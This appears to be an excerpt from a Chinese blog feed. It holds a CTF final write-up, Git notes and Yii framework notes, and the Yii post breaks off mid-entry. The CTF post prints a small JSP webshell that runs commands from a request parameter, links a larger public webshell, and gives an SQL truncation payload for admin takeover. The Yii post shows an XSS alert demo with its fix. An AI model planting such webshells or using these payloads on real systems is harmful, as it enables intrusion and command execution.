      <url>/2018/05/21/cumt-2018-final/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为上学期进入了决赛，于是在上周六进行了决赛，感觉自己还是太渣，最后只能跟队友做了两道题目拿了个三等奖，还是记录一下解题过程吧</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Jerry’s-Site-1"><a href="#Jerry’s-Site-1" class="headerlink" title="Jerry’s Site 1"></a>Jerry’s Site 1</h3><p>这个题目一开始忘了扫后台目录，直到有了hint存在<code>admin后台</code>并且存在弱口令才开始解决这道题目了，以后没思路的时候还是要扫描一波后台啊。。。说不定就有特别的发现了啊<br>根据弱口令，尝试用户名密码都是<code>admin</code>进入后台</p><p><img src="https://s1.ax1x.com/2018/05/21/C2cVOJ.jpg" alt="C2cVOJ.jpg"><br>随便点点，发现有个地方有点意思，可以增加文件，就是文件管理模块，但是当时可能运维出了点问题，没有开写权限，所以卡住了很久，后来题目恢复了就不存在问题了。。。<br><img src="https://s1.ax1x.com/2018/05/21/C2cem9.jpg" alt="C2cem9.jpg"></p><p>因为这个题目抓包发现是<code>Tomcat</code>服务器，想到了上一次某某杯比赛里面一道类似的上传文件的题目<br>所以想到<code>Tomcat</code>就会想到这是<code>Java</code>写的网站，于是就上网找<code>jsp木马</code></p><p>这里放上当时我上传的jsp大马<br><a href="https://raw.githubusercontent.com/tennc/webshell/master/jsp/JFolder.jsp" target="_blank" rel="noopener">https://raw.githubusercontent.com/tennc/webshell/master/jsp/JFolder.jsp</a></p><p>然后访问木马文件，在上层目录可以找<code>flag.txt</code>，下载下来打开即可</p><p>当然也可以找小马<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>hackbar里面执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jerry.bxsteam.xyz/cms/sky.jsp?pwd=023&amp;i=ls</span><br></pre></td></tr></table></figure></p><p>发现同样发现<code>flag.txt</code>，<code>cat</code>一波即可。。。</p><p>得到flag<br><code>cumtctf{thi3_1s_first_F4l9_in_thi_web}</code></p><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>这一道题目完全被提示带偏，说是二次注入，直接说是<code>SQL长度约束攻击</code>不就好了。。。。-_-||，这个题目手速快一点可能就有二等奖了<br>后来仔细想想，其实吧这也算是sql二次注入的一种。。。经过截断后再放进数据库里面搜索。。emmm</p><p>以前在bugku平台上做过一道类似的题目</p><p>直接在注册页面上注册下面的内容<br>我的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin                                                       &apos;</span><br><span class="line">password:123</span><br></pre></td></tr></table></figure><p>注意payload里面的如何利用空格去截断</p><p>注册完后跳转到登录页面，此时你就是<code>admin</code>用户了。。。<br>点击下面随意一个链接，得到flag</p><p>·cumtctf{easy_injection_for_fun}·</p><p>##结语<br>希望以后慢慢进步，变得更强吧。。<br>大佬们以后轻点虐。。。我进步得太慢。。。</p><p>web的全部wp:<a href="http://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/" target="_blank" rel="noopener">http://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Git学习笔记</title>
      <link href="/2018/04/18/git-learning/"/>
      <url>/2018/04/18/git-learning/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>   为了做项目，没办法得学一下Git</p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>因为为我是在Windows下运行的所以直接下载安装包安装，安装后右键打开Git-&gt;bash</p><p>在命令行里面输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"Your Name"</span></span><br><span class="line">$ git config --global user.email <span class="string">"email@example.com"</span></span><br></pre></td></tr></table></figure><p>因为分布式版本控制系统下每个机器都必须自报家门</p><p><code>注意</code>git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，</p><h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><p>在git-bash里面进入到放你项目的文件夹直接一条<code>git init</code>命令即可<br>这里会产生一个<code>.git</code>的隐藏文件，这里想起了CTF里面可能出现的<code>.git</code>源码泄露的题目，注意一下</p><p>把文件存储在版本库<br>两个步骤<br>第一步，使用命令<code>git add &lt;file&gt;</code>，注意，可反复多次使用，添加多个文件；</p><p>第二步，使用命令<code>git commit</code>，完成。<br>下面是一个例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add file1.txt</span><br><span class="line">$ git add file2.txt file3.txt</span><br><span class="line">$ git commit -m <span class="string">"add 3 files."</span></span><br></pre></td></tr></table></figure><p>提交到版本库后，<br>我们可以用下面的命令去查看状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>还有另外一条命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff + 具体被修改的文件</span><br></pre></td></tr></table></figure><p>可以查看修改内容<br><code>git log</code>命令查看当前版本库的状态<br>如果嫌输出信息太多，看得眼花缭乱的，可以试试加上<code>--pretty=oneline</code> 这样他就会输出各次修改的<code>commit id（版本号）</code></p><p>Git还提供了一个命令<code>git reflog</code>用来记录你的每一次命令,我们一般用这个去找回误删的步骤</p><h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><p>在Git中，用HEAD表示当前版本，也就是最新的提交commit id，上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个^比较容易数不过来，所以写成<code>HEAD~100</code><br>回退的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure><p>也可以这样去做<br><code>git reset --hard commit_id</code> 这里的commit_id可以不写完</p><h2 id="删除与恢复文件"><a href="#删除与恢复文件" class="headerlink" title="删除与恢复文件"></a>删除与恢复文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm + 文件名</span><br></pre></td></tr></table></figure><p>用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容。<br><code>git checkout -- file</code>可以丢弃工作区的修改，就是让这个文件回到最近一次git commit或git add时的状态。</p><hr><p>下面的步骤有点体现分布式特点了</p><h2 id="添加远程库"><a href="#添加远程库" class="headerlink" title="添加远程库"></a>添加远程库</h2><p>点击Create a new repository进入页面<br>自己新建个项目就好了<br><a href="https://imgchr.com/i/CgB48H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgB48H.md.png" alt="CgB48H.md.png"></a></p><p>要关联一个远程库，使用命令<code>git remote add origin git@server-name:path/repo-name.git</code><br>这部分后面的东西可以在你的项目中寻找,<br>这里还关系到https还有ssl，使用https除了速度慢以外，还有个最大的麻烦是每次推送都必须输入口令，但是在某些只开放<br>http端口的公司内部就无法使用ssh协议而只能用https。<br>关联后，使用命令<code>git push -u origin master</code><strong>第一次</strong>推送master分支的所有内容；</p><p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改</p><h2 id="从远程库克隆"><a href="#从远程库克隆" class="headerlink" title="从远程库克隆"></a>从远程库克隆</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@server-name:path/repo-name.git</span><br></pre></td></tr></table></figure><p>后面的内容跟关联很相似</p><h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><p>分支的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看分支：git branch</span><br><span class="line"></span><br><span class="line">创建分支：git branch &lt;name&gt;</span><br><span class="line"></span><br><span class="line">切换分支：git checkout &lt;name&gt;</span><br><span class="line"></span><br><span class="line">创建+切换分支：git checkout -b &lt;name&gt;</span><br><span class="line"></span><br><span class="line">合并某分支到当前分支：git merge &lt;name&gt;</span><br><span class="line"></span><br><span class="line">删除分支：git branch -d &lt;name&gt;</span><br></pre></td></tr></table></figure><h2 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h2><p>推送分支，就是把该分支上的所有本地提交推送到远程库。推送时，要指定本地分支，这样，Git就会把该分支推送到远程库对应的远程分支<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure></p><p>推送其他分支，比如dev，就改成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin dev</span><br></pre></td></tr></table></figure><p>自我感觉现在就这几部分对我的项目有帮助，先记下来，还有些内容等以后学习吧 </p><p>参考网站<br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000</a><br><a href="https://www.cnblogs.com/schaepher/p/4933873.html" target="_blank" rel="noopener">https://www.cnblogs.com/schaepher/p/4933873.html</a></p>]]></content>
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP_Yii框架学习笔记</title>
      <link href="/2018/04/11/PHP-Yii/"/>
      <url>/2018/04/11/PHP-Yii/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  最近准备要基于Yii框架写一个项目，于是准备自学一波，这里记录一下自己的笔记</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Yii框架的搭建"><a href="#Yii框架的搭建" class="headerlink" title="Yii框架的搭建"></a>Yii框架的搭建</h3><p>首先我用的是phpstudy环境下搭建Yii框架，注意这里一定要用PHP5.4以上的版本，我们可以通过Yii框架目录下的requirements.php查看我们还差一些什么条件之类的。<br><a href="https://imgchr.com/i/CgDiZV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgDiZV.md.png" alt="CgDiZV.md.png"></a></p><p>搭建框架我这里用了两种方法去安装</p><p>第一种直接官网上下载源码，解压后放到phpstudy的网站根目录下面，不过这种办法要自己手动设置cookie，这个文件在config目录下的web.php文件，这里最好设置到自己都不认得最好<br><a href="https://imgchr.com/i/CgDFaT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgDFaT.md.png" alt="CgDFaT.md.png"></a><br>也就是上图的红标的地方</p><p>第二种就是通过composer安装，这种方法就不用设置cookie，但这个方法下载的有点慢，而且安装过程中还会出现一系列毛病。。特别是关于那个SSL/TLS的设置，最后我是在php-ini里面把相关配置给弄好，而且在phpstudy里面把php-openssl打开才解决的，<br>但是最后命令航还是有这样的一句话<br><img src="https://s1.ax1x.com/2018/05/20/CgDkIU.png" alt="CgDkIU.png"><br>但好像对整体没啥影响。。。</p><p>上面的配置弄好以后可以在浏览器中打开web目录下的index.php，如果出现以下界面表明安装成功。<br><a href="https://imgchr.com/i/CgDus1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgDus1.md.png" alt="CgDus1.md.png"></a></p><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>为什么要提出命名空间概念，这是因为在文件包含的时候如果两个文件拥有相同的类的话，会出现下面的报错，这时候命名空间就会起到至关重要的作用了<br><a href="https://imgchr.com/i/CgDldK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgDldK.md.png" alt="CgDldK.md.png"></a></p><p>解决办法就是在任意包含的一个文件里面改变命名空间，用<code>using</code>语句，就像下图<br><img src="https://s1.ax1x.com/2018/05/20/CgDRLq.png" alt="CgDRLq.png"><br>我们在index页面可以这样去创建一个类，结果如下 </p><p><img src="https://s1.ax1x.com/2018/05/20/CgD4oT.png" alt="CgD4oT.png"></p><p>但是出现多个一样的类，机会显得冗余<br>于是我们可以这样做，同时我们还可以利用<code>as</code>去重命名类，这符合多个相同的类的文件包含的情况</p><p><img src="https://s1.ax1x.com/2018/05/20/CgDoYF.png" alt="CgDoYF.png"></p><p>在命名空间里面我们要注意的是如果不加using语句的话，默认是在一个全局命名空间里面，我们在用use语句是应该是这样的，千万要注意<code>\</code><br><img src="https://s1.ax1x.com/2018/05/20/CgDTW4.png" alt="CgDTW4.png"></p><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p>一般控制器的文件是放在<code>controllers</code>目录下面的<br>一般命名的格式为<code>name+Controller</code>，以<code>Controller</code>这个单词结束<br>而在对应的文件里面的类我们也应该同名(因为我们所说的控制器大部分都是一个类，而且规定得放在一个命名空间里面)<br>而且定义的类必须的再继承控制器这一个类，所以<code>extends</code>后面的东西不能少</p><p>但是<code>extends</code>后面的<code>Controller</code>也是一个类，也有自己的命名空间，于是我们还得加上<code>use yii\web\Controller</code>;<br>里面的操作必须以<code>action</code>开头加上名字</p><p><img src="https://s1.ax1x.com/2018/05/20/CgDHSJ.png" alt="CgDHSJ.png"></p><p>我们如何来引用这个操作，我们就要在入口脚本里面加上<code>r=hello/index</code>,其中hello是指hello控制器，index是指hello控制器下的index的操作<br><img src="https://s1.ax1x.com/2018/05/20/CgDXex.png" alt="CgDXex.png"></p><h3 id="控制器请求处理"><a href="#控制器请求处理" class="headerlink" title="控制器请求处理"></a>控制器请求处理</h3><p>控制器下传参的话一般我们可以调用一个全局的类YII，以这样的url为例子说明在代码里面是如何执行的，这个url表明了现在的操作是hello控制器下的index操作的传参操作<br><img src="https://s1.ax1x.com/2018/05/20/CgDvTK.png" alt="CgDvTK.png"></p><p>我们首先要调用全局类Yii下的静态变量$app，也就是应用主体里面的request方法<br>记得不要忘记<code>$request = \Yii::$app-&gt;request</code>中的\缺了就可能报错，虽然官方文档没加，但是尝试过后发现还是要加上的，所以说前面为什么在命名空间里面提及要全局类前面加上<code>\</code></p><p>对于get传参我们可以这样去利用<br><code>$request-&gt;get(&#39;id&#39;,20)</code>，第一个参数是get方式请求的名字，第二个是传参返回的默认值，还有post传参也是这样的操作</p><p>还有一个常用的方法就是判断他是post方法还是get方法<br><code>$request-&gt;isGet</code>,如下图<br><img src="https://s1.ax1x.com/2018/05/20/CgrCSH.png" alt="CgrCSH.png"></p><p><img src="https://s1.ax1x.com/2018/05/20/Cgri6A.png" alt="Cgri6A.png"><br>同样的Post也一样，举一反三而已<br>我们还能获取ip地址例如<code>$request-&gt;userIp</code></p><p>更多的方法还可以去查官方手册</p><h3 id="控制器响应"><a href="#控制器响应" class="headerlink" title="控制器响应"></a>控制器响应</h3><p>关于控制器的响应，我们可以利用这个东西去进行多个操作<br>首先这一个东西也需要调用全局类Yii下的静态变量$app，也就是应用主体里面的<code>response</code>方法</p><p>假定前提条件是<code>$res=\YII::$app-&gt;response</code><br>我们可以利用他来改变返回的状态码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;statusCode = &apos;404&apos;;  //默认是200</span><br></pre></td></tr></table></figure><p>我们还可以用来改变header的一些属性<br><code>$res-&gt;headers-&gt;add(&#39;pogram&#39;,&#39;1234556&#39;);</code>给头部增加属性</p><p>还能设置跟删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;headers-&gt;set(&apos;pogram&apos;,&apos;123456&apos;);</span><br><span class="line">$res-&gt;headers-&gt;remove(&apos;program&apos;);</span><br></pre></td></tr></table></figure><p>还有跳转功能<br><code>$res-&gt;headers-&gt;add(&#39;location&#39;,&#39;http://www.baidu.com&#39;);</code>  但是这一句话好像没什么反应。。官方手册我也没找到。。莫非被抛弃了？</p><p>但是由于这个功能比较常用，所以直接封装在Controller里面，这就有了第二种写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;redirect(&apos;http://www.baidu.com&apos;,302); //这里的第二个参数是状态码</span><br></pre></td></tr></table></figure><p>文件下载功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res-&gt;headers-&gt;add(&apos;content-disposition&apos;,&apos;attachment;filename=&quot;a.jpg&quot;&apos;);  这里的文件名自定义，但总觉得记着里面的参数有点困难</span><br></pre></td></tr></table></figure><p>同样的因为常用而有一个更直接的<code>send</code>方法<br><code>$res-&gt;sendFile(&quot;./robots.txt&quot;);</code>注意这里的文件是存在于web目录下也就是当前目录下的的文件</p><p>这一部分参考文档也很详细，我就选几个重要的来学习一下。。。</p><h3 id="Session处理"><a href="#Session处理" class="headerlink" title="Session处理"></a>Session处理</h3><p>同样的这也是在全局类Yii下的应用主体app下的session方法<br>以<code>$session = \YII::$app-&gt;session;</code>为例<br>判断是否设置了session用一个方法isActive方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($session-&gt;isAcive)</span><br></pre></td></tr></table></figure><p>而打开session我们可以用open()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;open()</span><br></pre></td></tr></table></figure><p>这里列举一下session的增删改查</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;set(<span class="string">'user'</span>,<span class="string">'abcde'</span>); <span class="comment">//增设一条session数据，我们可以看到在PHPstudy里面的tmp目录下多了一条session数据</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CgrVTf.png" alt="CgrVTf.png"><br>如果想获取这一条session里面的数据的话<br>我们可以这样去调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$session-&gt;get(<span class="string">'user'</span>);<span class="comment">//在编译器里面echo一波他就会出现</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/20/CgrMlj.png" alt="CgrMlj.png"><br>如果删除的话，我们可以这样去实现</p><p><code>$session-&gt;remove(&#39;user&#39;);</code><br><img src="https://s1.ax1x.com/2018/05/20/Cgr3mq.png" alt="Cgr3mq.png"><br>当然上面的办法是通过Yii框架里面的类去实现的，我们还可以利用数组方式去设置，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$session[<span class="string">'user'</span>]=<span class="string">'abcde'</span>;</span><br><span class="line"><span class="keyword">echo</span> $session[<span class="string">'user'</span>];</span><br><span class="line"><span class="keyword">unset</span> ($session[<span class="string">'user'</span>]);</span><br></pre></td></tr></table></figure><p><code>注意</code><br>如果我们在其他浏览器echo一下session的话，他是不会出现任何东西的，原因是他会识别session里面的文件名，进而把里面的内容拿出来，好像是不同的浏览器产生的session的文件名不一样。。</p><h3 id="Cookie处理"><a href="#Cookie处理" class="headerlink" title="Cookie处理"></a>Cookie处理</h3><p>从<code>响应</code>里面获取数据并往浏览器里面写入cookie数据，我们可以利用下面的语句<br>首先我们得从全局类Yii下的应用主体app下的response获取对应的cookies方法<br>也就是<code>/YII::$app-&gt;response-&gt;cookies</code>;</p><p>我们添加一个cookies信息,可以这样去写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookies = \YII::$app-&gt;response-&gt;cookies;</span><br><span class="line">$cookie_data = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'user'</span>,<span class="string">'value'</span>=&gt;<span class="string">'1232123'</span>);</span><br><span class="line">$cookies-&gt;add(<span class="keyword">new</span> Cookie($cookie_data));  <span class="comment">//注意这里add参数里面是一个Cookie对象，引用这样的对象我们需要在代码</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/Cgr800" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgr800.md.png" alt="Cgr800.md.png"></a><br>的前面使用一个命名空间<code>use yii\web\Cookie;</code><br>如果我们要修改某一个cookie的值的话，直接改变value的值即可，他会自动覆盖掉原来的数据<br>删除的话我们就可以直接用<code>$cookies-&gt;remove(&#39;id&#39;); //里面是cookie的名字</code></p><p>从<code>请求</code>里面拿出cookie数据，我们这个时候使用的是app下的request对应的cookies方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookies = \YII::$app-&gt;request-&gt;cookies;</span><br><span class="line">$cookies-&gt;getValue(<span class="string">'user'</span>);</span><br></pre></td></tr></table></figure><p>但如果上面的cookie不存在的话，他会返回第二个默认的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cookie-&gt;getValue(&apos;users&apos;,24);</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/CgrttU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgrttU.md.png" alt="CgrttU.md.png"></a></p><p>cookie这东西为什么在浏览器里面看来是一串混乱的数字呢，是因为它用了我们上面总结的在config目录下的web.php文件里面的cookiekey加密的</p><h3 id="视图的创建"><a href="#视图的创建" class="headerlink" title="视图的创建"></a>视图的创建</h3><p>过多的html或者js会给我们带来冗余的代码，这里就涉及到Yii框架给我们带来的一套解决方案，就是把一些前端代码放在一个叫views的文件夹下</p><p>我这里是在views文件夹下新建了一个hello文件夹对应上面的hello控制器，而且这个文件夹下存在一个名为index.php的文件，里面存有HTML格式<br><img src="https://s1.ax1x.com/2018/05/20/CgrDn1.png" alt="CgrDn1.png"><br>一般我们把里面的文件称为视图文件,而Yii框架规定了我们需要在对应控制器名字的文件夹下寻找对应的文件(文件夹不区分大写小好像)</p><p><img src="https://s1.ax1x.com/2018/05/20/Cgr6AK.png" alt="Cgr6AK.png"><br>我们在对应的控制器文件里面需要调用renderPartial函数，但是由于这个数属于Controller类，所以我们直接调用<br><code>return $this-&gt;renderPartial(&#39;views下对应的文件名/*为了方便管理Yii框架规定不要后缀名*/&#39;);</code><br>而且这里的return也是是Yii框架规定的，调用视图只能够这样写了</p><h3 id="视图传送数据"><a href="#视图传送数据" class="headerlink" title="视图传送数据"></a>视图传送数据</h3><p>我们可以通过数组去传递视图要的数据，主要步骤是先创建一个数组，再利用数组里面的key和value<br>然后再利用renderPartial函数的第二个参数去传参<br>这里是controller页面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$hello_str= <span class="string">'Hello World'</span>;</span><br><span class="line">        $test_array = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//创建数组</span></span><br><span class="line">        $data = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把需要传给视图的值放进数组中</span></span><br><span class="line">        $data[<span class="string">'view_hellostr'</span>]=$hello_str;</span><br><span class="line">        $data[<span class="string">'view_array'</span>]=$test_array;</span><br><span class="line">        <span class="keyword">return</span>  <span class="keyword">$this</span>-&gt;renderPartial(<span class="string">'index'</span>,$data);</span><br></pre></td></tr></table></figure><p>在view下的hello/index.php下的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_hellostr<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="php"><span class="meta">&lt;?</span>=$view_array[<span class="number">0</span>]<span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们是利用了controller里面数组的键值作为这一个页面输出的变量，记得带$符号，我好几次都忘记了，还有的话数组记得加下标，不然会报错的</p><p>另外补充一个知识点</p><p>这里的利用了php的短标签<br>在php的配置文件（php.ini）中有一个<code>short_open_tag</code>的值，开启以后可以使用PHP的短标签：<code>&lt;? ?&gt;</code><br>同时，只有开启这个才可以使用 <code>&lt;?=</code> 以代替 <code>&lt;? echo</code> ，=表示输出，不过建议用<code>&lt;?php ?&gt;</code></p><h3 id="视图数据的安全"><a href="#视图数据的安全" class="headerlink" title="视图数据的安全"></a>视图数据的安全</h3><p>这里涉及到一个xss安全问题，学习视频发现这里应该是反射型xss，主要原因是过滤不严谨导致的。。复习一波安全知识<br>下面就是如何来防御的<br>我们把上面代码的变量<code>$hello_str= &#39;Hello World&#39;;</code>改为<code>$hello_str= &#39;Hello World&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&#39;;</code><br>这是一个弹窗代码，如果用户输入的是这样的，那就会直接弹窗，体验会很差<br>解决的办法有两个，一个是编码一下，再输出，另一种是直接过滤掉js代码<br>我们只需要在view页面下的hello/index.php下的代码做修改，但是我们需要提前使用它们的命名空间，所以前面加上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">Html</span>;     <span class="comment">//第一种方法的命名空间</span></span><br><span class="line"> <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">helpers</span>\<span class="title">HtmlPurifier</span>;   <span class="comment">//第二种方法的命名空间</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?</span>=Html::encode($view_hellostr)<span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?</span>=HtmlPurifier::process($view_hellostr)<span class="meta">?&gt;</span>&lt;/h1&gt;  <span class="comment">//利用了process的方法</span></span><br></pre></td></tr></table></figure><p>页面显示结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><h3 id="布局文件"><a href="#布局文件" class="headerlink" 